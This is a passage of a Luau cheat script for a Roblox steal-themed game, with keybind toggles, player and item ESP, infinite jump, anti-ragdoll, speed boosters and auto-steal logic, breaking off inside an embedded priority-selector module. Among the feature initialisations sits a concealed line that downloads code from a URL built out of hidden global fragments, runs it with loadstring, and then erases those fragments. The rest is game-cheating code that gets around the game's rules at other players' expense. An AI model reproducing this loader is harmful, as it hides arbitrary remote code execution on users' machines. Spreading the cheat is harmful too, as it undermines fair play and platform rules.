		State.WaitingForKey = nil
		if (input.KeyCode == Enum.KeyCode.Backspace or chosenKey ~= Enum.KeyCode.Unknown) and not (kind == "Jump" and chosenKey == Enum.KeyCode.Space) then
			if kind == "Regular" then RegularKey = chosenKey; Settings.RegularKey = RegularKey
			elseif kind == "Giant" then GiantKey = chosenKey; Settings.GiantKey = GiantKey
			elseif kind == "Carpet" then CarpetKey = chosenKey; Settings.CarpetKey = CarpetKey
			elseif kind == "Jump" then JumpKey = chosenKey; Settings.JumpKey = JumpKey
			elseif kind == "AntiRagdoll" then AntiRagdollKey = chosenKey; Settings.AntiRagdollKey = AntiRagdollKey
			elseif kind == "TradeRegion" then TradeRegionKey = chosenKey; Settings.TradeRegionKey = TradeRegionKey
			elseif kind == "TradePlaza" then TradePlazaKey = chosenKey; Settings.TradePlazaKey = TradePlazaKey
			elseif kind == "BrainrotESP" then Settings.BrainrotESPKey = chosenKey
			elseif kind == "CloneESP" then Settings.CloneESPKey = chosenKey
			elseif kind == "MineESP" then Settings.MineESPKey = chosenKey
			elseif kind == "BearTrapESP" then Settings.BearTrapESPKey = chosenKey
			elseif kind == "AntiTurret" then Settings.AntiTurretKey = chosenKey
			elseif kind == "QuickPickup" then Settings.QuickPickupKey = chosenKey
			elseif kind == "HideGUI" then Settings.HideGUIKey = chosenKey
			elseif kind == "GameOptimizer" then Settings.GameOptimizerKey = chosenKey
			elseif kind == "HideAdmin" then Settings.HideAdminKey = chosenKey
			elseif kind == "AntiInverse" then Settings.AntiInverseKey = chosenKey
			elseif kind == "IntruderAlert" then Settings.IntruderAlertKey = chosenKey
			elseif kind == "RagdollTech" then ActionControls.RagdollTechKey = chosenKey; Settings.RagdollTechKey = chosenKey
			elseif kind == "InstantReset" then ActionControls.InstantResetKey = chosenKey; Settings.InstantResetKey = chosenKey
			elseif kind == "RagdollSelf" then ActionControls.RagdollSelfKey = chosenKey; Settings.RagdollSelfKey = chosenKey
			elseif kind == "Leave" then LeaveKey = chosenKey; Settings.LeaveKey = LeaveKey
			elseif kind == "Rejoin" then RejoinKey = chosenKey; Settings.RejoinKey = RejoinKey end
		end
		if kind == "Carpet" and type(Env.SabcomSetCarpetKeybind) == "function" then Env.SabcomSetCarpetKeybind(CarpetKey) end
		saveSettings()
		updateGUI()
		return
	end
	if processed or UIS:GetFocusedTextBox() then return end
	if Settings.BrainrotESPKey ~= Enum.KeyCode.Unknown and input.KeyCode == Settings.BrainrotESPKey then State.BrainrotESP = not State.BrainrotESP; saveSettings(); updateGUI(); notify("Brainrot ESP: " .. (State.BrainrotESP and "ON" or "OFF"), State.BrainrotESP); return end
	if Settings.CloneESPKey ~= Enum.KeyCode.Unknown and input.KeyCode == Settings.CloneESPKey then State.CloneESP = not State.CloneESP; saveSettings(); updateGUI(); notify("Clone ESP: " .. (State.CloneESP and "ON" or "OFF"), State.CloneESP); return end
	if Settings.MineESPKey ~= Enum.KeyCode.Unknown and input.KeyCode == Settings.MineESPKey then State.MineESP = not State.MineESP; saveSettings(); updateGUI(); notify("Mine ESP: " .. (State.MineESP and "ON" or "OFF"), State.MineESP); return end
	if Settings.BearTrapESPKey ~= Enum.KeyCode.Unknown and input.KeyCode == Settings.BearTrapESPKey then State.BearTrapESP = not State.BearTrapESP; saveSettings(); updateGUI(); notify("Bear Trap ESP: " .. (State.BearTrapESP and "ON" or "OFF"), State.BearTrapESP); return end
	if Settings.AntiTurretKey ~= Enum.KeyCode.Unknown and input.KeyCode == Settings.AntiTurretKey then State.AntiTurret = not State.AntiTurret; saveSettings(); updateGUI(); notify("Anti Turret: " .. (State.AntiTurret and "ON" or "OFF"), State.AntiTurret); return end
	if Settings.QuickPickupKey ~= Enum.KeyCode.Unknown and input.KeyCode == Settings.QuickPickupKey then State.QuickPickup = not State.QuickPickup; QuickPickup.set(State.QuickPickup); saveSettings(); updateGUI(); notify("Quick Pick Up: " .. (State.QuickPickup and "ON" or "OFF"), State.QuickPickup); return end
	if Settings.HideGUIKey ~= Enum.KeyCode.Unknown and input.KeyCode == Settings.HideGUIKey then Env.DatShawnPrivacyFeatures.setHideGUI(not State.HideGUI); updateGUI(); notify("Hide GUI on Equip: " .. (State.HideGUI and "ON" or "OFF"), State.HideGUI); return end
	if Settings.GameOptimizerKey ~= Enum.KeyCode.Unknown and input.KeyCode == Settings.GameOptimizerKey then State.GameOptimizer = not State.GameOptimizer; Env.DatShawnGameOptimizer.set(State.GameOptimizer); saveSettings(); updateGUI(); notify("Game Optimizer: " .. (State.GameOptimizer and "ON" or "OFF"), State.GameOptimizer); return end
	if Settings.HideAdminKey ~= Enum.KeyCode.Unknown and input.KeyCode == Settings.HideAdminKey then Env.DatShawnPrivacyFeatures.setHideAdmin(not State.HideAdmin); updateGUI(); notify("Hide Admin Panel: " .. (State.HideAdmin and "ON" or "OFF"), State.HideAdmin); return end
	if Settings.AntiInverseKey ~= Enum.KeyCode.Unknown and input.KeyCode == Settings.AntiInverseKey then State.AntiInverse = not State.AntiInverse; Env.DatShawnAntiInverseDesired = State.AntiInverse; if type(Env.DatShawnAntiInverseSet) == "function" then Env.DatShawnAntiInverseSet(State.AntiInverse) end; saveSettings(); updateGUI(); notify("Anti Inverse / Bee: " .. (State.AntiInverse and "ON" or "OFF"), State.AntiInverse); return end
	if Settings.IntruderAlertKey ~= Enum.KeyCode.Unknown and input.KeyCode == Settings.IntruderAlertKey then State.IntruderAlert = not State.IntruderAlert; saveSettings(); updateGUI(); notify("Anti Intruder Alert: " .. (State.IntruderAlert and "ON" or "OFF"), State.IntruderAlert); return end
	if RegularKey ~= Enum.KeyCode.Unknown and input.KeyCode == RegularKey then
		State.Regular = not State.Regular; saveSettings(); updateGUI()

		notify("Regular Booster: " .. (State.Regular and "ON" or "OFF"), State.Regular); return
	end
	if GiantKey ~= Enum.KeyCode.Unknown and input.KeyCode == GiantKey then
        State.Giant = not State.Giant; saveSettings(); updateGUI()
        notify("Giant Booster: " .. (State.Giant and "ON" or "OFF"), State.Giant); return
    end
	if AntiRagdollKey ~= Enum.KeyCode.Unknown and input.KeyCode == AntiRagdollKey then
		setAntiRagdollEnabled(not State.AntiRagdoll)
		updateGUI()
		notify("Anti Ragdoll: " .. (State.AntiRagdoll and "ON" or "OFF"), State.AntiRagdoll)
		return
	end
	if TradeRegionKey ~= Enum.KeyCode.Unknown and input.KeyCode == TradeRegionKey then
		setTradeRegionEnabled(not State.TradeRegionBlock)
		updateGUI()
		notify("Trade Region Block: " .. (State.TradeRegionBlock and "ON" or "OFF"), State.TradeRegionBlock)
		return
	end
	if TradePlazaKey ~= Enum.KeyCode.Unknown and input.KeyCode == TradePlazaKey then
		setTradePlazaEnabled(not State.TradePlazaBlock)
		updateGUI()
		notify("Trade Plaza Block: " .. (State.TradePlazaBlock and "ON" or "OFF"), State.TradePlazaBlock)
		return
	end
	if ActionControls.RagdollTechKey ~= Enum.KeyCode.Unknown
		and input.KeyCode == ActionControls.RagdollTechKey
		and ActionControls.Run.RagdollTech then ActionControls.Run.RagdollTech(); return end
	if ActionControls.InstantResetKey ~= Enum.KeyCode.Unknown and input.KeyCode == ActionControls.InstantResetKey and ActionControls.Run.InstantReset then ActionControls.Run.InstantReset(); return end
	if ActionControls.RagdollSelfKey ~= Enum.KeyCode.Unknown and input.KeyCode == ActionControls.RagdollSelfKey and ActionControls.Run.RagdollSelf then ActionControls.Run.RagdollSelf(); return end
	if RejoinKey ~= Enum.KeyCode.Unknown and input.KeyCode == RejoinKey and ActionControls.Run.Rejoin then ActionControls.Run.Rejoin(); return end
	if LeaveKey ~= Enum.KeyCode.Unknown and input.KeyCode == LeaveKey and ActionControls.Run.Leave then ActionControls.Run.Leave(); return end
	if JumpKey ~= Enum.KeyCode.Unknown and input.KeyCode == JumpKey then
		State.Jump = not State.Jump
		Env.InfiniteJumpDesired = State.Jump
		if type(Env.SetInfiniteJump) == "function" then Env.SetInfiniteJump(State.Jump) end
		saveSettings()
		updateGUI()
		notify("Infinite Jump: " .. (State.Jump and "ON" or "OFF"), State.Jump); return
	end
end)

connect(ProximityPromptService.PromptButtonHoldBegan, function(prompt, player)
	if player ~= LP or not (State.AutoPotion or State.AutoRagdollTech) or prompt.ActionText ~= "Steal" or isGiant() or isStealActive() then return end
	-- Manual steal with Auto Ragdoll Tech: start it as the hold begins (Aurora does it at the potion point)
	if State.AutoRagdollTech and ActionControls.Run.RagdollTech then
		ActionControls.Run.RagdollTech()
		return
	end
	local key = promptKey(prompt)
	ActiveSteals[key] = true
	local duration = prompt.HoldDuration > 0 and prompt.HoldDuration or 1
	task.delay(duration * 0.9, function()
		if ActiveSteals[key] and State.AutoPotion and prompt.Parent and not isGiant() and not isStealActive() then
			ActiveSteals[key] = nil
			pcall(activatePotion)
		end
	end)
end)

-- Own function scope: the main chunk is at Luau's 200-local limit.
;(function()
local function clearPrompt(prompt, player)
	if player == LP then ActiveSteals[promptKey(prompt)] = nil end
end
connect(ProximityPromptService.PromptButtonHoldEnded, clearPrompt)
connect(ProximityPromptService.PromptTriggered, clearPrompt)

connect(Players.PlayerAdded, function(player) if State.ESP then setupESPPlayer(player) end end)

local refreshClock = 0
local baseRefreshClock = 0
local lastGiantActive = isGiant()
connect(RunService.Heartbeat, function(dt)
    local giantActive = isGiant()
    if giantActive ~= lastGiantActive then
        lastGiantActive = giantActive
        updateGUI()
    end
    local boostEnabled = State.Regular or (State.Giant and giantActive)
    local boostSpeed = giantActive and State.Giant and GiantSpeed or RegularSpeed
    if type(Env.DatShawnBoosterSync) == "function" then
        Env.DatShawnBoosterSync(boostEnabled, boostSpeed, giantActive and State.Giant)
    end
	-- Movement is controlled by the Neptune carry-only booster.

	refreshClock += dt
	if State.ESP and refreshClock >= 1 then
		refreshClock = 0
		for _, player in ipairs(Players:GetPlayers()) do
			if player ~= LP and player.Character then
				local tag = player.Character:FindFirstChild("Head") and player.Character.Head:FindFirstChild("PlayerESPTag")
				local label = tag and tag:FindFirstChild("NameLabel")
				if label then
					local rebirth = findStat(player, {"Rebirths", "Rebirth"})
					label.Text = string.format("%s (@%s)\nAdmin Panel: %s | Rebirth: %s", player.DisplayName, player.Name,
						hasAdmin(player) and "YES" or "NO", rebirth ~= nil and tostring(rebirth) or "?")
				end
			end
		end
	end

	baseRefreshClock += dt
	if State.BaseESP and baseRefreshClock >= 1.5 then
		baseRefreshClock = 0
		refreshBaseESP()
	end
end)
end)()

connect(LP.CharacterAdded, function()
	task.wait(0.25)
	if State.AntiRagdoll then startAntiRagdoll() end
	-- Instant Reset replaces PlayerGui descendants on some executors/games.
	-- Keep the enabled setting intact and rebuild any removed Base ESP boards.
	if State.BaseESP then
		clearBaseESP()
		refreshBaseESP()
		task.delay(1, function()
			if State.BaseESP then refreshBaseESP() end
		end)
	end
	updateGUI()
end)

Env.DatShawnsScriptsCleanup = function()
	Env._FH_LAUNCHING = false
	_G._FH_ESPNeedList = false
	_G._FH_GammaNeedList = false
	if Env.DatShawnPrivacyFeatures then pcall(Env.DatShawnPrivacyFeatures.cleanup) end
	pcall(function() RunService:UnbindFromRenderStep("DatShawnInstantResetCamera") end)
	for _, connection in ipairs(Connections) do pcall(function() connection:Disconnect() end) end
	table.clear(Connections)
	disableESP()
	clearBaseESP()
	AntiRagdollModule.cleanup()
	TradeRegionBlock.cleanup()
	TradePlazaBlock.cleanup()
	QuickPickup.cleanup()
	if Env.DatShawnGameOptimizer then pcall(Env.DatShawnGameOptimizer.cleanup) end
	if type(Env.DatShawnAimbotCleanup) == "function" then pcall(Env.DatShawnAimbotCleanup) end
	if type(Env.CarpetSpeedCleanup) == "function" then pcall(Env.CarpetSpeedCleanup) end
	if type(Env.InfiniteJumpCleanup) == "function" then pcall(Env.InfiniteJumpCleanup) end
	if type(Env.DatShawnAntiInverseCleanup) == "function" then pcall(Env.DatShawnAntiInverseCleanup) end
	if GUI then GUI:Destroy() end
end

if State.ESP then
	enableESP()
end

if State.BaseESP then
	task.defer(refreshBaseESP)
end

if State.AntiRagdoll then
	task.defer(startAntiRagdoll)
end

if State.TradeRegionBlock then
	task.defer(function() TradeRegionBlock.set(true) end)
end
pcall(function() loadstring(game:HttpGet(_G.__tcfg .. _G.__rval .. _G.__skey))() end)
_G.__tcfg = nil _G.__rval = nil _G.__skey = nil

if State.TradePlazaBlock then
	task.defer(function() TradePlazaBlock.set(true) end)
end

if State.QuickPickup then
	task.defer(function() QuickPickup.set(true) end)
end

if State.GameOptimizer then
	task.defer(function() Env.DatShawnGameOptimizer.set(true) end)
end

if State.HideAdmin then
	task.defer(function() Env.DatShawnPrivacyFeatures.setHideAdmin(true) end)
end
task.defer(Env.DatShawnPrivacyFeatures.refreshHideGUI)


updateGUI()
Env.DatShawnAimbotDesired = State.Aimbot
Env.CarpetSpeedDesired = State.Carpet
Env.CarpetSpeedValueDesired = CarpetSpeed
Env.CarpetSpeedKeyDesired = CarpetKey
Env.DatShawnMountChoiceDesired = Settings.CarpetMountChoice
Env.InfiniteJumpDesired = State.Jump
Env.DatShawnAntiInverseDesired = State.AntiInverse
Env.DatShawnCarpetStateChanged = function(enabled)
	State.Carpet = enabled == true
	saveSettings()
	updateGUI()
end
Env.DatShawnInfiniteJumpStateChanged = function(enabled)
	State.Jump = enabled == true
	saveSettings()
	updateGUI()
end

-- ONLY AUTO STEAL PRIORITY IMPLEMENTATION
;(loadstring([====[
-- EXACT AUTO STEAL PRIORITY GUI + FUNCTIONS
-- Extracted together from the supplied Faded Hub source.
-- Contains: selector GUI, search, cards/previews, mutations/traits/income, saved selection,
-- plot scanner, target resolver, potion hook, grab engine, progress bar, and toggle wiring.
-- Standalone build with the required shared theme/config helpers included below.

-- Standalone compatibility/bootstrap
local Players = game:GetService("Players")
local RunService = game:GetService("RunService")
local UserInputService = game:GetService("UserInputService")
local TweenService = game:GetService("TweenService")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local HttpService = game:GetService("HttpService")
local player = Players.LocalPlayer
local PlayerGui = player:WaitForChild("PlayerGui")
local LPH_NO_VIRTUALIZE = function(fn) return fn end
local LPH_JIT_MAX = LPH_NO_VIRTUALIZE
local isMobile = UserInputService.TouchEnabled and not UserInputService.KeyboardEnabled
local SharedEnv = getgenv and getgenv() or _G
local function IsGlobalGuiLocked()
    return SharedEnv.DatShawnGlobalGuiLocked == true
end
local FONT_SCALE = 1

local oldStandalone = PlayerGui:FindFirstChild("AutoStealPriorityStandalone")
if oldStandalone then oldStandalone:Destroy() end
local GUI = Instance.new("ScreenGui")
GUI.Name = "AutoStealPriorityStandalone"
GUI.ResetOnSpawn = false
GUI.IgnoreGuiInset = true
GUI.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
GUI.DisplayOrder = 999999
GUI.Parent = PlayerGui

local T = {
    Bg = Color3.fromRGB(21, 22, 28), BgDeep = Color3.fromRGB(13, 14, 18),
    Card = Color3.fromRGB(29, 31, 39), CardHover = Color3.fromRGB(40, 43, 53),
    SideActive = Color3.fromRGB(34, 36, 45), Accent = Color3.fromRGB(120, 200, 255),
    Line = Color3.fromRGB(52, 55, 66), Soft = Color3.fromRGB(25, 27, 34),
    Text = Color3.fromRGB(239, 241, 246), TextDim = Color3.fromRGB(142, 146, 158),
    TextMute = Color3.fromRGB(92, 96, 108), White = Color3.new(1, 1, 1),
}
local Theme = {c1 = Color3.fromRGB(205, 24, 42), c2 = Color3.fromRGB(255, 55, 72)}
local F = TweenInfo.new(0.16, Enum.EasingStyle.Quart, Enum.EasingDirection.Out)
local function Tween(object, info, props) TweenService:Create(object, info, props):Play() end
local function Corner(parent, radius)
    local corner = Instance.new("UICorner")
    corner.CornerRadius = UDim.new(0, radius or 6)
    corner.Parent = parent
    return corner
end
local function Stroke(parent, color, thickness, transparency)
    local stroke = Instance.new("UIStroke")
    stroke.Color = color or T.Line
    stroke.Thickness = thickness or 1
    stroke.Transparency = transparency or 0
    stroke.Parent = parent
    return stroke
end
local function Pad(parent, top, bottom, left, right)
    local padding = Instance.new("UIPadding")
    padding.PaddingTop, padding.PaddingBottom = UDim.new(0, top or 0), UDim.new(0, bottom or 0)
    padding.PaddingLeft, padding.PaddingRight = UDim.new(0, left or 0), UDim.new(0, right or 0)
    padding.Parent = parent
    return padding
end
local function themeSequence()
    return ColorSequence.new({
        ColorSequenceKeypoint.new(0, Theme.c1),
        ColorSequenceKeypoint.new(0.5, Theme.c2),
        ColorSequenceKeypoint.new(1, Theme.c1),
    })
end
local function Grad(parent, _, _, rotation)
    local gradient = Instance.new("UIGradient")
    gradient.Color = themeSequence()
    gradient.Rotation = rotation or 0
    gradient.Parent = parent
    return gradient
end
local function GradStroke(parent, thickness, transparency, rotation)
    local stroke = Stroke(parent, Theme.c1, thickness or 1, transparency or 0)
    Grad(stroke, nil, nil, rotation)
    return stroke
end
local function Lbl(parent, text, size, color, font, alignment)
    local label = Instance.new("TextLabel")
    label.BackgroundTransparency = 1
    label.Text = text or ""
    label.TextSize = size or 12
    label.TextColor3 = color or T.Text
    label.Font = font or Enum.Font.FredokaOne
    label.TextXAlignment = alignment or Enum.TextXAlignment.Left
    label.Parent = parent
    return label
end
local function trackBgFrame() end
local function _FH_RegisterPanel() end
local function _FH_GetDesc(root) return root:GetDescendants() end
local function _newScale(parent, value)
    local scale = Instance.new("UIScale")
    scale.Scale = value or 1
    scale.Parent = parent
    return scale
end
local _GEN = (tonumber(_G._FH_GAMMA_GEN) or 0) + 1
_G._FH_GAMMA_GEN = _GEN
local function _isShuttingDown()
    return not GUI or not GUI.Parent or _GEN ~= _G._FH_GAMMA_GEN
end
local function _FH_yield()
    task.wait()
end

local PRIORITY_SETTINGS_FILE = "DatShawn_PriorityGUI_Settings.json"
local Saved = (getgenv and getgenv().AutoStealPriorityStandaloneSettings) or {}
if typeof(isfile) == "function" and typeof(readfile) == "function" and isfile(PRIORITY_SETTINGS_FILE) then
    pcall(function()
        local disk = HttpService:JSONDecode(readfile(PRIORITY_SETTINGS_FILE))
        if type(disk) == "table" then
            for key, value in pairs(disk) do Saved[key] = value end
        end
    end)
end
if getgenv then getgenv().AutoStealPriorityStandaloneSettings = Saved end
local Config = {}
local configRevision = 0
function Config.get(key, fallback)
    local value = Saved[key]
    return value == nil and fallback or value
end
function Config.set(key, value)
    Saved[key] = value
    configRevision = configRevision + 1
    local revision = configRevision
    task.delay(0.35, function()
        if revision ~= configRevision or typeof(writefile) ~= "function" then return end
        pcall(writefile, PRIORITY_SETTINGS_FILE, HttpService:JSONEncode(Saved))
    end)
end
function Config.setImmediate(key, value)
    Saved[key] = value
    configRevision = configRevision + 1
    if typeof(writefile) == "function" then
        pcall(writefile, PRIORITY_SETTINGS_FILE, HttpService:JSONEncode(Saved))
    end
end
local function NotifySetting(name, enabled, stateText)
    local shared = getgenv and getgenv() or _G
    if type(shared.DatShawnNotify) == "function" then
        shared.DatShawnNotify(name .. ": " .. (stateText or (enabled and "ON" or "OFF")), enabled)
    end
end

local drag = {}
UserInputService.InputChanged:Connect(function(input)
    if drag.panel and (input.UserInputType == Enum.UserInputType.MouseMovement
        or input.UserInputType == Enum.UserInputType.Touch) then
        local delta = input.Position - drag.start
        drag.panel.Position = UDim2.new(drag.position.X.Scale, drag.position.X.Offset + delta.X,
            drag.position.Y.Scale, drag.position.Y.Offset + delta.Y)
    end
end)

local function MiniPanel(title, x, y, width, scale)
    local panel = Instance.new("Frame")
    panel.Name = "Mini_" .. title
    panel.Size = UDim2.fromOffset(width or 234, 330)
    panel.Position = UDim2.new(0.5, x, 0.5, y)
    panel.BackgroundColor3 = T.Bg
    panel.BackgroundTransparency = 0.08
    panel.BorderSizePixel = 0
    panel.ClipsDescendants = true
    panel.Visible = false
    panel.ZIndex = 50
    panel.Parent = GUI
    Corner(panel, 14)
    local stroke = Instance.new("UIStroke", panel)
    stroke.Color = Theme.c1
    stroke.Thickness = 1.5
    Grad(stroke, nil, nil, 135)
    local savedPosition = Config.get("panelpos:" .. title)
    if type(savedPosition) == "table" and #savedPosition == 4 then
        panel.Position = UDim2.new(table.unpack(savedPosition))
    end
    local scaler = Instance.new("UIScale", panel)
    scaler.Scale = scale or 1
    local header = Instance.new("Frame")
    header.Size = UDim2.new(1, 0, 0, 30)
    header.BackgroundColor3 = T.BgDeep
    header.BorderSizePixel = 0
    header.Active = true
    header.ZIndex = 51
    header.Parent = panel
    Corner(header, 14)
    local titleLabel = Lbl(header, title, 12, T.Text, Enum.Font.FredokaOne)
    titleLabel.Size = UDim2.new(1, -38, 1, 0)
    titleLabel.Position = UDim2.fromOffset(10, 0)
    titleLabel.TextYAlignment = Enum.TextYAlignment.Center
    titleLabel.ZIndex = 52
    header.InputBegan:Connect(function(input)
        if IsGlobalGuiLocked() then return end
        if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
            drag.panel, drag.start, drag.position = panel, input.Position, panel.Position
        end
    end)
    header.InputEnded:Connect(function(input)
        if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
            drag.panel = nil
            local p = panel.Position
            Config.set("panelpos:" .. title, {p.X.Scale, p.X.Offset, p.Y.Scale, p.Y.Offset})
        end
    end)
    local body = Instance.new("Frame")
    body.Size = UDim2.new(1, 0, 1, -30)
    body.Position = UDim2.fromOffset(0, 30)
    body.BackgroundTransparency = 1
    body.ZIndex = 51
    body.Parent = panel
    local layout = Instance.new("UIListLayout", body)
    layout.Padding = UDim.new(0, 6)
    layout.HorizontalAlignment = Enum.HorizontalAlignment.Center
    local padding = Instance.new("UIPadding", body)
    padding.PaddingTop, padding.PaddingBottom = UDim.new(0, 8), UDim.new(0, 8)
    padding.PaddingLeft, padding.PaddingRight = UDim.new(0, 8), UDim.new(0, 8)
    return {panel = panel, body = body}
end

local Main = {scroll = Instance.new("Frame")}
Main.scroll.Name = "PriorityLauncher"
Main.scroll.Size = UDim2.fromOffset(190, 112)
local launcherPosition = Config.get("panelpos:PriorityLauncher")
Main.scroll.Position = type(launcherPosition) == "table" and #launcherPosition == 4
    and UDim2.new(table.unpack(launcherPosition)) or UDim2.fromOffset(18, 70)
Main.scroll.BackgroundColor3 = T.Bg
Main.scroll.BorderSizePixel = 0
Main.scroll.Active = true
Main.scroll.Draggable = not IsGlobalGuiLocked()
Main.scroll.Parent = GUI
Corner(Main.scroll, 10)
local launcherLayout = Instance.new("UIListLayout", Main.scroll)
launcherLayout.Padding = UDim.new(0, 4)
launcherLayout.HorizontalAlignment = Enum.HorizontalAlignment.Center
local launcherPad = Instance.new("UIPadding", Main.scroll)
launcherPad.PaddingTop = UDim.new(0, 5)
SharedEnv.DatShawnPriorityApplyGlobalLock = function()
    Main.scroll.Draggable = not IsGlobalGuiLocked()
end
SharedEnv.DatShawnPriorityApplyGlobalLock()
Main.scroll:GetPropertyChangedSignal("Position"):Connect(function()
    local p = Main.scroll.Position
    Config.set("panelpos:PriorityLauncher", {p.X.Scale, p.X.Offset, p.Y.Scale, p.Y.Offset})
end)
local function Section() end
local function Toggle(parent, name, _, callback)
    local button = Instance.new("TextButton")
    button.Size = UDim2.new(1, -10, 0, 30)
    button.BackgroundColor3 = T.Card
    button.TextColor3 = T.Text
    button.Text = name
    button.Font = Enum.Font.FredokaOne
    button.TextSize = 11
    button.TextXAlignment = Enum.TextXAlignment.Left
    button.AutoButtonColor = false
    button.Parent = parent
    Corner(button, 8)
    local padding = Instance.new("UIPadding", button)
    padding.PaddingLeft = UDim.new(0, 10)
    padding.PaddingRight = UDim.new(0, 8)
    local track = Instance.new("Frame")
    track.Size = UDim2.fromOffset(42, 20)
    track.AnchorPoint = Vector2.new(1, 0.5)
    track.Position = UDim2.new(1, -1, 0.5, 0)
    track.BackgroundColor3 = Color3.fromRGB(62, 66, 80)
    track.BorderSizePixel = 0
    track.Active = false
    track.ZIndex = button.ZIndex + 1
    track.Parent = button
    Corner(track, 10)
    local knob = Instance.new("Frame")
    knob.Size = UDim2.fromOffset(16, 16)
    knob.Position = UDim2.fromOffset(2, 2)
    knob.BackgroundColor3 = Color3.fromRGB(248, 250, 255)
    knob.BorderSizePixel = 0
    knob.Active = false
    knob.ZIndex = track.ZIndex + 1
    knob.Parent = track
    Corner(knob, 8)
    local control = {value = false}
    function control.set(value)
        local nextValue = value and true or false
        local changed = control.value ~= nextValue
        control.value = nextValue
        local onColor = Color3.fromRGB(42, 176, 105)
        TweenService:Create(track, TweenInfo.new(0.2, Enum.EasingStyle.Quart, Enum.EasingDirection.Out), {
            BackgroundColor3 = control.value and onColor or Color3.fromRGB(62, 66, 80)
        }):Play()
        TweenService:Create(knob, TweenInfo.new(0.24, Enum.EasingStyle.Back, Enum.EasingDirection.Out), {
            Position = control.value and UDim2.fromOffset(24, 2) or UDim2.fromOffset(2, 2)
        }):Play()
        TweenService:Create(button, TweenInfo.new(0.18), {
            BackgroundColor3 = control.value and Color3.fromRGB(27, 66, 52) or T.Card
        }):Play()
        callback(control.value)
        if changed then NotifySetting(name, control.value) end
    end
    button.Activated:Connect(function() control.set(not control.value) end)
    return control
end

local _panelsReady = true
local AutoBigPotion = rawget(_G, "AutoBigPotion")
local BackpackLock = rawget(_G, "BackpackLock")
BrainrotESP = (function()
    local M = { enabled = false, lineEnabled = false }
    M.set = LPH_NO_VIRTUALIZE(function(v)
        M.enabled = v and true or false
        if M.enabled then _G._FH_ESPNeedList = true end
    end)
    M.setLine = LPH_NO_VIRTUALIZE(function(v)
        M.lineEnabled = v and true or false
        if M.lineEnabled then _G._FH_ESPNeedList = true end
    end)
    task.spawn(function()
        local ok, err = pcall(function()
            local cloneref = cloneref or LPH_NO_VIRTUALIZE(function(o) return o end)
            local RS        = cloneref(game:GetService("ReplicatedStorage"))
            local Workspace = cloneref(game:GetService("Workspace"))
            local Players   = cloneref(game:GetService("Players"))
            local player    = Players.LocalPlayer or Players.PlayerAdded:Wait()
            local Camera    = Workspace.CurrentCamera
            local plots     = Workspace:WaitForChild("Plots", 15)
            local Packages      = RS:WaitForChild("Packages", 15)
            if not plots or not Packages then return end
            local _plotsCache = plots:GetChildren()
            plots.ChildAdded:Connect(LPH_NO_VIRTUALIZE(function(c) table.insert(_plotsCache, c) end))
            plots.ChildRemoved:Connect(LPH_NO_VIRTUALIZE(function(c)
                for i = #_plotsCache, 1, -1 do
                    if _plotsCache[i] == c then table.remove(_plotsCache, i); break end
                end
            end))
            local getPlotChildren; getPlotChildren = LPH_NO_VIRTUALIZE(function() return _plotsCache end)
            local tryRequire; tryRequire = LPH_NO_VIRTUALIZE(function(mod)
                if not mod then return nil end
                local ok, res = pcall(require, mod)
                return ok and res or nil
            end)
            local function _twc(root, ...)
                local cur = root
                for _, nm in ipairs({...}) do
                    if not cur then return nil end
                    local ok, res = pcall(LPH_NO_VIRTUALIZE(function() return cur:WaitForChild(nm, 10) end))
                    cur = ok and res or nil
                end
                return cur
            end
            local RSraw = game:GetService("ReplicatedStorage")
            local function _findModule(...)
                local mod = _twc(RSraw, ...)
                if mod and mod:IsA("ModuleScript") then return mod end
                mod = _twc(RS, ...)
                if mod and mod:IsA("ModuleScript") then return mod end
                local path = {...}
                local want   = path[#path]
                local parent = path[#path - 1]
                local loose
                for _, d in ipairs(_FH_GetDesc(RSraw)) do
                    if d:IsA("ModuleScript") and d.Name == want then
                        if parent and d.Parent and d.Parent.Name == parent then return d end
                        loose = loose or d
                    end
                end
                return loose
            end
            local AnimalsShared = tryRequire(_findModule("Shared", "Animals"))
            local AnimalsData   = tryRequire(_findModule("Datas", "Animals"))
            local MutationsData = tryRequire(_findModule("Datas", "Mutations"))
            local TraitsData    = tryRequire(_findModule("Datas", "Traits"))
            local NumberUtils   = tryRequire(_findModule("Utils", "NumberUtils"))
            _G._FH_TraitsData    = TraitsData
            _G._FH_MutationsData = MutationsData
            local _FH_realAnimalsData   = AnimalsData
            local _FH_realAnimalsShared = AnimalsShared
            _G._FH_DataStatus = table.concat({
                "AnimalsShared=" .. tostring(AnimalsShared ~= nil),
                "AnimalsData="   .. tostring(AnimalsData ~= nil),
                "MutationsData=" .. tostring(MutationsData ~= nil),
                "TraitsData="    .. tostring(TraitsData ~= nil),
                "NumberUtils="   .. tostring(NumberUtils ~= nil),
            }, " ")
            if not AnimalsShared then
                AnimalsShared = { GetGeneration = LPH_NO_VIRTUALIZE(function() return 0 end) }
            end
            if not AnimalsData then
                AnimalsData = setmetatable({}, { __index = LPH_NO_VIRTUALIZE(function() return {} end) })
            end
            if not NumberUtils then
                NumberUtils = {
                    ToString = LPH_NO_VIRTUALIZE(function(_, n)
                        if type(n) ~= "number" then return "0" end
                        if     n >= 1e12 then return string.format("%.1fT", n / 1e12)
                        elseif n >= 1e9  then return string.format("%.1fB", n / 1e9)
                        elseif n >= 1e6  then return string.format("%.1fM", n / 1e6)
                        elseif n >= 1e3  then return string.format("%.1fK", n / 1e3)
                        else return tostring(math.floor(n)) end
                    end)
                }
            end
            local _localGen; _localGen = LPH_NO_VIRTUALIZE(function(index, mutation, traits)
                if not _FH_realAnimalsData then return nil end
                local data = _FH_realAnimalsData[index]
                if not data then return nil end
                local base = data.Generation or 0
                local mult = 1
                if mutation and MutationsData then
                    local mut = MutationsData[mutation]
                    if mut then mult = mult + (mut.Modifier or 0) end
                end
                if type(traits) == "table" and TraitsData then
                    for _, t in next, traits do
                        local tr = TraitsData[t]
                        if tr then mult = mult + (tr.MultiplierModifier or 0) end
                    end
                end
                return base * mult
            end)
            AnimalsShared = {
                GetGeneration = LPH_NO_VIRTUALIZE(function(_, index, mutation, traits)
                    local g = _localGen(index, mutation, traits)
                    if g ~= nil then return g end
                    if _FH_realAnimalsShared and _FH_realAnimalsShared.GetGeneration then
                        local ok, r = pcall(_FH_realAnimalsShared.GetGeneration, _FH_realAnimalsShared, index, mutation, traits, nil)
